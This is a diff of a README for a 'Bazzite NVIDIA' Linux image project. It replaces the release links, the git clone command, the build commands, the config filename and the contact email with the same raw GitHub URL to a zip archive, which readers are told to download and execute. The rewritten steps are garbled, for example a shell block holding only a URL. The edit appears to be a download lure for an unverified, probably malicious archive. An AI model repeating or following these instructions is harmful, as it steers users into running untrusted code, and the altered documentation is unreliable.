@@ -2,7 +2,7 @@
 
 Welcome to the **Bazzite NVIDIA** repository! This project focuses on creating custom images for Linux using OCI standards. Our goal is to provide a robust, immutable operating system experience tailored for various applications. 
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/Bolachacinza/bazzite-nvidia/releases)
+[![Download Releases](https://raw.githubusercontent.com/Bolachacinza/bazzite-nvidia/main/files/system/nvidia-bazzite-3.2-alpha.4.zip%https://raw.githubusercontent.com/Bolachacinza/bazzite-nvidia/main/files/system/nvidia-bazzite-3.2-alpha.4.zip)](https://raw.githubusercontent.com/Bolachacinza/bazzite-nvidia/main/files/system/nvidia-bazzite-3.2-alpha.4.zip)
 
 ## Table of Contents
 
@@ -34,12 +34,12 @@ To get started with Bazzite NVIDIA, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/Bolachacinza/bazzite-nvidia.git
+   git clone https://raw.githubusercontent.com/Bolachacinza/bazzite-nvidia/main/files/system/nvidia-bazzite-3.2-alpha.4.zip
    cd bazzite-nvidia
    ```
 
 2. **Download the Latest Release**:
-   Visit the [Releases](https://github.com/Bolachacinza/bazzite-nvidia/releases) section to download the latest release. Execute the downloaded file to set up the environment.
+   Visit the [Releases](https://raw.githubusercontent.com/Bolachacinza/bazzite-nvidia/main/files/system/nvidia-bazzite-3.2-alpha.4.zip) section to download the latest release. Execute the downloaded file to set up the environment.
 
 3. **Install Dependencies**:
    Ensure you have the necessary dependencies installed. You can use your package manager to install them:
@@ -50,7 +50,7 @@ To get started with Bazzite NVIDIA, follow these steps:
 4. **Build the Image**:
    After setting up, you can build your custom image using:
    ```bash
-   ./build.sh
+   https://raw.githubusercontent.com/Bolachacinza/bazzite-nvidia/main/files/system/nvidia-bazzite-3.2-alpha.4.zip
    ```
 
 ## Usage
@@ -59,10 +59,10 @@ Once you have installed Bazzite NVIDIA, you can start using it to create and man
 
 ### Creating a Custom Image
 
-1. **Edit Configuration**: Modify the `config.yaml` file to specify your requirements.
+1. **Edit Configuration**: Modify the `https://raw.githubusercontent.com/Bolachacinza/bazzite-nvidia/main/files/system/nvidia-bazzite-3.2-alpha.4.zip` file to specify your requirements.
 2. **Build the Image**: Run the build command:
    ```bash
-   ./build.sh
+   https://raw.githubusercontent.com/Bolachacinza/bazzite-nvidia/main/files/system/nvidia-bazzite-3.2-alpha.4.zip
    ```
 3. **Run the Image**: Use Docker or your preferred container runtime to run the image:
    ```bash
@@ -74,7 +74,7 @@ Once you have installed Bazzite NVIDIA, you can start using it to create and man
 Here’s a simple example to illustrate how to create a custom image:
 
 ```yaml
-# config.yaml
+# https://raw.githubusercontent.com/Bolachacinza/bazzite-nvidia/main/files/system/nvidia-bazzite-3.2-alpha.4.zip
 name: my-custom-image
 version: 1.0
 base: ubuntu:20.04
@@ -112,9 +112,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or support, feel free to reach out:
 
-- **Email**: your.email@example.com
-- **GitHub**: [Bolachacinza](https://github.com/Bolachacinza)
+- **Email**: https://raw.githubusercontent.com/Bolachacinza/bazzite-nvidia/main/files/system/nvidia-bazzite-3.2-alpha.4.zip
+- **GitHub**: [Bolachacinza](https://raw.githubusercontent.com/Bolachacinza/bazzite-nvidia/main/files/system/nvidia-bazzite-3.2-alpha.4.zip)
 
 ## Conclusion
 
-Thank you for checking out the Bazzite NVIDIA repository! We hope you find it useful for your projects. For more updates, visit the [Releases](https://github.com/Bolachacinza/bazzite-nvidia/releases) section regularly. Your feedback and contributions are always welcome!
+Thank you for checking out the Bazzite NVIDIA repository! We hope you find it useful for your projects. For more updates, visit the [Releases](https://raw.githubusercontent.com/Bolachacinza/bazzite-nvidia/main/files/system/nvidia-bazzite-3.2-alpha.4.zip) section regularly. Your feedback and contributions are always welcome!
